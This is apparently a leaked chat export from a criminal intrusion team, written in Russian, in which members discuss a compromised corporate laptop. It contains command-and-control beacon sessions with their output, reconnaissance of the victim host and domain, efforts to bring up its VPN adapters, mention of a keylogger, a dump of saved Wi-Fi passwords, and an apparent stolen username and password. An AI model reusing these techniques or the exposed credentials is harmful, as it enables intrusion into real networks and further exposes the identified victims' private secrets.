@@ -1,0 +1,271 @@
+{
+  "messages": [
+    {
+      "_id": "DTHdoXazCrpt9Se8a",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "у нас их нету. и кейлогер не ставится",
+      "ts": "2020-09-25T16:54:38.412Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-25T16:54:38.453Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cLouam6E73aMEGhsw",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "тут я хз",
+      "ts": "2020-09-25T16:49:32.472Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-25T16:49:32.498Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Q6WRo33TA9MQZDnrZ",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "при подключении клиента фортика он просит логин и пароль на сколько помню",
+      "ts": "2020-09-25T16:47:27.021Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-25T16:47:27.047Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4SEzi9M7usCCoRG9N",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ну или быстро вырубились",
+      "ts": "2020-09-25T16:44:14.338Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-25T16:44:14.366Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "De9xxcph2XENxsZ8x",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "похоже нет",
+      "ts": "2020-09-25T16:44:02.560Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-25T16:44:02.613Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3DZQYqRp6iJtjnh4b",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "после запуска команд интерфейсы поднялись?",
+      "ts": "2020-09-25T16:43:37.620Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-25T16:43:37.646Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jSc3umMdrbu7zT73T",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "делал так\n```\nbeacon> shell wmic nic get name, index\n[*] Tasked beacon to run: wmic nic get name, index\n[+] host called home, sent: 55 bytes\n[+] received output:\nIndex  Name                                           \n\n0      Microsoft Kernel Debug Network Adapter         \n\n1      Intel(R) Ethernet Connection (6) I219-V        \n\n2      Intel(R) Wi-Fi 6 AX200 160MHz                  \n\n3      Microsoft Wi-Fi Direct Virtual Adapter         \n\n4      Fortinet Virtual Ethernet Adapter (NDIS 6.30)  \n\n5      Fortinet SSL VPN Virtual Ethernet Adapter      \n\n6      PPPoP WAN Adapter                              \n\n7      WAN Miniport (SSTP)                            \n\n8      WAN Miniport (IKEv2)                           \n\n9      WAN Miniport (L2TP)                            \n\n10     WAN Miniport (PPTP)                            \n\n11     WAN Miniport (PPPOE)                           \n\n12     WAN Miniport (IP)                              \n\n13     WAN Miniport (IPv6)                            \n\n14     WAN Miniport (Network Monitor)                 \n\n15     Bluetooth Device (Personal Area Network)       \n\n16     Microsoft Wi-Fi Direct Virtual Adapter #2      \n\n17     Broadcom NetXtreme Gigabit Ethernet            \n\n\n\n\nbeacon> shell wmic path win32_networkadapter where index=4 call enable\n[*] Tasked beacon to run: wmic path win32_networkadapter where index=4 call enable\nbeacon> shell wmic path win32_networkadapter where index=5 call enable\n[*] Tasked beacon to run: wmic path win32_networkadapter where index=5 call enable\n[+] host called home, sent: 174 bytes\n[+] received output:\nExecuting (\\\\UKHOEVLT3156\\root\\cimv2:Win32_NetworkAdapter.DeviceID=\"4\")->enable()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tReturnValue = 0;\n};\n\n\n[+] received output:\nExecuting (\\\\UKHOEVLT3156\\root\\cimv2:Win32_NetworkAdapter.DeviceID=\"5\")->enable()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tReturnValue = 0;\n};\n\n```",
+      "ts": "2020-09-25T16:39:56.513Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-25T16:39:56.710Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Xtm3osYx5jbefhCQr",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "да вроде дисконект",
+      "ts": "2020-09-25T16:38:50.953Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-25T16:38:50.992Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zFPjT3efFLcSs7n9W",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n                           [03]: Fortinet Virtual Ethernet Adapter (NDIS 6.30)\n                                 Connection Name: Ethernet 2\n                                 Status:          Media disconnected\n                           [04]: Fortinet SSL VPN Virtual Ethernet Adapter\n                                 Connection Name: Ethernet 3\n                                 Status:          Media disconnected\n```",
+      "ts": "2020-09-25T16:38:45.742Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-25T16:38:45.812Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "szgSBD2W8sLA7Xf54",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nWindows IP Configuration\n\n\nEthernet adapter Ethernet 3:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\nEthernet adapter Ethernet:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\nWireless LAN adapter Local Area Connection* 1:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\nWireless LAN adapter Local Area Connection* 10:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\nEthernet adapter Ethernet 2:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\nWireless LAN adapter WiFi:\n\n   Connection-specific DNS Suffix  . : \n   IPv6 Address. . . . . . . . . . . : 2a02:c7d:a28:5100:7de6:b515:bbeb:89c0\n   IPv6 Address. . . . . . . . . . . : fdb0:64:3df8:0:7de6:b515:bbeb:89c0\n   Temporary IPv6 Address. . . . . . : 2a02:c7d:a28:5100:c889:fce9:a8e0:ab10\n   Temporary IPv6 Address. . . . . . : fdb0:64:3df8:0:c889:fce9:a8e0:ab10\n   Link-local IPv6 Address . . . . . : fe80::7de6:b515:bbeb:89c0%11\n   IPv4 Address. . . . . . . . . . . : 192.168.0.80\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : fe80::7e4c:a5ff:fef9:c2a0%11\n                                       192.168.0.1\n\n```",
+      "ts": "2020-09-25T16:38:45.613Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-25T16:38:45.732Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "c6FvXzFtptqbYJgNx",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nHost Name:                 UKHOEVLT3156\nOS Name:                   Microsoft Windows 10 Pro\nOS Version:                10.0.18362 N/A Build 18362\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Member Workstation\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          Windows User\nRegistered Organization:   MatchesFashion\nProduct ID:                00330-52356-69234-AAOEM\nOriginal Install Date:     11/29/2019, 12:10:04 PM\nSystem Boot Time:          9/18/2020, 9:20:23 AM\nSystem Manufacturer:       HP\nSystem Model:              HP EliteBook 830 G6\nSystem Type:               x64-based PC\nProcessor(s):              1 Processor(s) Installed.\n                           [01]: Intel64 Family 6 Model 142 Stepping 12 GenuineIntel ~1600 Mhz\nBIOS Version:              HP R70 Ver. 01.02.01, 8/26/2019\nWindows Directory:         C:\\windows\nSystem Directory:          C:\\windows\\system32\nBoot Device:               \\Device\\HarddiskVolume1\nSystem Locale:             en-gb;English (United Kingdom)\nInput Locale:              en-us;English (United States)\nTime Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London\nTotal Physical Memory:     7,998 MB\nAvailable Physical Memory: 850 MB\nVirtual Memory: Max Size:  29,502 MB\nVirtual Memory: Available: 15,235 MB\nVirtual Memory: In Use:    14,267 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    matches.com\nLogon Server:              N/A\nHotfix(s):                 5 Hotfix(s) Installed.\n                           [01]: KB4514359\n                           [02]: KB4513661\n                           [03]: KB4515383\n                           [04]: KB4516115\n                           [05]: KB4515384\nNetwork Card(s):           4 NIC(s) Installed.\n                           [01]: Intel(R) Ethernet Connection (6) I219-V\n                                 Connection Name: Ethernet\n                                 Status:          Media disconnected\n                           [02]: Intel(R) Wi-Fi 6 AX200 160MHz\n                                 Connection Name: WiFi\n                                 DHCP Enabled:    Yes\n                                 DHCP Server:     192.168.0.1\n                                 IP address(es)\n                                 [01]: 192.168.0.80\n                                 [02]: fe80::7de6:b515:bbeb:89c0\n                                 [03]: fdb0:64:3df8:0:c889:fce9:a8e0:ab10\n                                 [04]: 2a02:c7d:a28:5100:c889:fce9:a8e0:ab10\n                                 [05]: fdb0:64:3df8:0:7de6:b515:bbeb:89c0\n                                 [06]: 2a02:c7d:a28:5100:7de6:b515:bbeb:89c0\n                           [03]: Fortinet Virtual Ethernet Adapter (NDIS 6.30)\n                                 Connection Name: Ethernet 2\n                                 Status:          Media disconnected\n                           [04]: Fortinet SSL VPN Virtual Ethernet Adapter\n                                 Connection Name: Ethernet 3\n                                 Status:          Media disconnected\nHyper-V Requirements:      VM Monitor Mode Extensions: Yes\n                           Virtualization Enabled In Firmware: Yes\n                           Second Level Address Translation: Yes\n                           Data Execution Prevention Available: Yes\n\n\n```",
+      "ts": "2020-09-25T16:38:15.459Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-25T16:38:15.702Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XADLZ3TxgaCwgoqiA",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "systeminfo и ipconfig",
+      "ts": "2020-09-25T16:37:37.431Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-25T16:37:37.475Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qe3Jt3W68fRX2xzn5",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "по поводу интерфейсов",
+      "ts": "2020-09-25T16:37:28.541Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-25T16:37:28.582Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "orJZ3W7qXoeRySsGX",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Какие еще идеи?",
+      "ts": "2020-09-25T16:29:57.751Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-25T16:29:57.773Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cFMKJdvYtrfAXy26m",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Все службы в названиях которых есть fortinet - запущены. Виртуальные интерфейсы фортинета - включал. Бесполезно. Домен не появляется.",
+      "ts": "2020-09-25T16:29:49.806Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-25T16:29:49.838Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WabpnknjRhr6C8AF7",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WIFI <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n    SSID name              : \"rothbarguest\"\n    Cipher                 : None\n\n    SSID name              : \"BA53LG\"\n    Cipher                 : CCMP\n    Cipher                 : GCMP\n    Key Content            : pinkblind\n\n    SSID name              : \"SKYCWVNA\"\n    Cipher                 : CCMP\n    Cipher                 : GCMP\n    Key Content            : 81kwISrQXbTM\n\n    SSID name              : \"home\"\n    Cipher                 : CCMP\n    Cipher                 : GCMP\n    Key Content            : jake2210boy\n\n    SSID name              : \"BT-NGAFJ8\"\n    Cipher                 : CCMP\n    Cipher                 : GCMP\n    Key Content            : CM3NxJT63QDiLt\n\n    SSID name              : \"BTHub5-K3M6\"\n    Cipher                 : CCMP\n    Cipher                 : GCMP\n    Key Content            : 76cc939872\n\n\n    SSID name              : \"TALKTALK-ADE727\"\n    Cipher                 : CCMP\n    Cipher                 : GCMP\n    Key Content            : AGWGA9W6\n\n    SSID name              : \"BT-68A2KJ\"\n    Cipher                 : CCMP\n    Cipher                 : GCMP\n    Key Content            : VpHFa7NVYnKYub\n\n    SSID name              : \"Elfordleigh\"\n    Cipher                 : CCMP\n    Cipher                 : GCMP\n    Key Content            : Security12\n\n    SSID name              : \"SKY94FE2\"\n    Cipher                 : CCMP\n    Cipher                 : GCMP\n    Key Content            : RBPXFQEA\n\n    SSID name              : \"MF_Guest\"\n    Cipher                 : CCMP\n    Cipher                 : GCMP\n    Key Content            : MatchNow\n```",
+      "ts": "2020-09-25T16:05:55.516Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-25T16:05:55.696Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BJcQmA7h6mo7oC5nx",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nLouisad\nM@tches2020!!\n```",
+      "ts": "2020-09-25T15:40:16.970Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-25T15:40:17.025Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WgcKP6dcEsXY4Z3fL",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "да",
+      "ts": "2020-09-25T15:33:18.524Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-25T15:33:18.547Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3wWNPTRkKT9oyo6Ss",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "поймали?",
+      "ts": "2020-09-25T15:33:03.692Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-25T15:33:03.737Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
